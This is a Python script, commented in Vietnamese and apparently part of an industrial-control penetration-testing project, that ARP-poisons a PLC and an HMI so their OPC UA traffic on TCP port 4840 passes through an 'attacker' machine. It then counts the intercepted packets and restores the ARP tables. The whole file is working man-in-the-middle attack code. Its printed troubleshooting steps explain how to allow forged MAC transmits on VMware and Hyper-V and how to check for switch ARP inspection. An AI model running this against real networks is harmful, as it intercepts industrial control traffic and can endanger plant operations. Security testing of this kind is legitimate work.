#!/usr/bin/env python3
"""
diag_arp_redirect.py -- Chan doan THUAN TUY: ARP poison co redirect duoc
traffic PLC<->HMI qua may attacker khong? Khong sua/spoof bat ky gia tri
nao, chi dem xem TCP:4840 giua PLC va HMI co lot vao may nay khong sau khi
poison. Dung de tach bach: neu ket qua la 0, van de nam o TANG MANG (ARP/
switch/VM), khong phai o code parse OPC UA cua attacks_ext/*.

Chay (Admin/Windows hoac sudo/Linux), TAT IP forwarding truoc khi chay:
  python diag_arp_redirect.py --plc 192.168.210.211 --hmi 192.168.210.31 \
      --iface "\\Device\\NPF_{GUID}" --duration 20
"""

import argparse
import threading
import time

try:
    from scapy.all import ARP, Ether, IP, TCP, sendp, srp, sniff, get_if_hwaddr
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    raise SystemExit(1)

stop_flag = threading.Event()
counts = {"total_4840": 0, "from_plc": 0, "from_hmi": 0, "poison_sent": 0}


def _is_null_mac(mac):
    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")


def resolve_attacker_mac(iface, plc_ip):
    """get_if_hwaddr(iface) tren Npcap/Windows hay tra ve MAC rong -- day la
    bug da biet, xem tests/test_mitm_opcua_spoof.py's resolve_attacker_mac()
    (ham nay copy lai y het logic do). Neu dung MAC rong lam hwsrc, ARP poison
    quang bao "IP nay o MAC 00:00:00:00:00:00" -- vo nghia, nan nhan khong the
    gui traffic ve dung may attacker => redirect luon la 0 goi bat ke ARP co
    "gui duoc" hay khong."""
    try:
        mac = get_if_hwaddr(iface)
        if not _is_null_mac(mac):
            return mac, "get_if_hwaddr"
    except Exception:
        pass
    try:
        from scapy.all import conf
        _, attacker_ip, _ = conf.route.route(plc_ip)
        from scapy.arch.windows import get_windows_if_list
        for i in get_windows_if_list():
            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
                return i["mac"], f"windows_if_list(ip={attacker_ip})"
    except Exception:
        pass
    try:
        from scapy.all import conf
        mac = getattr(conf.iface, "mac", None)
        if not _is_null_mac(mac):
            return mac, "conf.iface.mac"
    except Exception:
        pass
    return None, "FAILED"


def get_mac(ip, timeout=2):
    # KHONG truyen iface= vao srp() -- da xac nhan qua tests/test_mitm_opcua_spoof.py
    # rang tren Windows/Npcap, truyen iface= tuong minh vao srp() lam ARP request/
    # reply khong khop dung interface va luon that bai; de scapy tu chon interface
    # mac dinh lai hoat dong dung.
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        print(f"[!] get_mac({ip}) loi: {e}")
        return None


def poison_loop(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=attacker_mac)
    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=attacker_mac)
    while not stop_flag.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        counts["poison_sent"] += 2
        time.sleep(1)


def restore(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
    fix_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)


def cb(pkt, plc_ip, hmi_ip):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    if pkt[TCP].sport != 4840 and pkt[TCP].dport != 4840:
        return
    counts["total_4840"] += 1
    if pkt[IP].src == plc_ip:
        counts["from_plc"] += 1
    elif pkt[IP].src == hmi_ip:
        counts["from_hmi"] += 1
    eth_src = getattr(pkt, "src", "?")
    print(f"  [PKT #{counts['total_4840']}] {pkt[IP].src}->{pkt[IP].dst} eth.src={eth_src}")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--plc", default="192.168.210.211")
    p.add_argument("--hmi", default="192.168.210.31")
    p.add_argument("--iface", required=True)
    p.add_argument("--duration", type=int, default=20)
    args = p.parse_args()

    print(f"[*] Resolving MAC: PLC={args.plc}  HMI={args.hmi}  iface={args.iface}")
    plc_mac = get_mac(args.plc)
    hmi_mac = get_mac(args.hmi)
    print(f"    PLC MAC = {plc_mac}")
    print(f"    HMI MAC = {hmi_mac}")
    if not plc_mac or not hmi_mac:
        print("[!] Khong resolve duoc MAC -- dung lai. Kiem tra IFACE dung chua, may co ket noi mang do khong.")
        return

    attacker_mac, mac_method = resolve_attacker_mac(args.iface, args.plc)
    print(f"[*] Attacker MAC = {attacker_mac}  (resolve qua: {mac_method})")
    if _is_null_mac(attacker_mac):
        print("[!] CANH BAO: khong resolve duoc MAC hop le bang bat ky cach nao -- dung lai, kiem tra IFACE.")
        return

    print(f"\n[*] Bat dau poison trong {args.duration}s, dong thoi dem goi TCP:4840 giua PLC<->HMI lot qua iface nay...")
    print("    (Khong sua gi ca -- day chi la dem, de tach bach loi ARP khoi loi parse OPC UA)\n")

    t = threading.Thread(
        target=poison_loop,
        args=(plc_mac, hmi_mac, args.plc, args.hmi, args.iface, attacker_mac),
        daemon=True,
    )
    t.start()
    time.sleep(2)

    sniff(
        filter="tcp port 4840",
        prn=lambda pkt: cb(pkt, args.plc, args.hmi),
        timeout=args.duration,
        store=False,
        iface=args.iface,
    )

    stop_flag.set()
    time.sleep(0.5)
    restore(plc_mac, hmi_mac, args.plc, args.hmi, args.iface)

    print("\n=== KET QUA ===")
    print(f"Poison packets da gui : {counts['poison_sent']}")
    print(f"TCP:4840 thay duoc    : {counts['total_4840']}  (tu PLC={counts['from_plc']}, tu HMI={counts['from_hmi']})")
    if counts["total_4840"] == 0:
        print("\n=> KHONG thay goi nao ca. ARP poison KHONG redirect duoc traffic qua may nay.")
        print("   Kiem tra tiep theo thu tu uu tien:")
        print("   1. May attacker co phai VM khong? Neu co: tat 'MAC Address Spoofing'/'Forged")
        print("      Transmits' protection tren vSwitch (VMware: Network Adapter Security ->")
        print("      MAC Address Changes + Forged Transmits = Accept; Hyper-V: Set-VMNetworkAdapter")
        print("      -MacAddressSpoofing On).")
        print("   2. Switch vat ly co Dynamic ARP Inspection / Port Security khong?")
        print("   3. PLC/HMI co static ARP entry cho nhau khong (kiem tra 'arp -a' tren tung may).")
    elif counts["from_plc"] > 0 and counts["from_hmi"] > 0:
        print("\n=> Redirect thanh cong CA HAI CHIEU -- ARP poison hoat dong tot tren may nay.")
    else:
        print("\n=> Redirect MOT PHAN (chi 1 chieu) -- kiem tra lai gia tri --plc/--hmi va MAC tuong ung.")


if __name__ == "__main__":
    main()
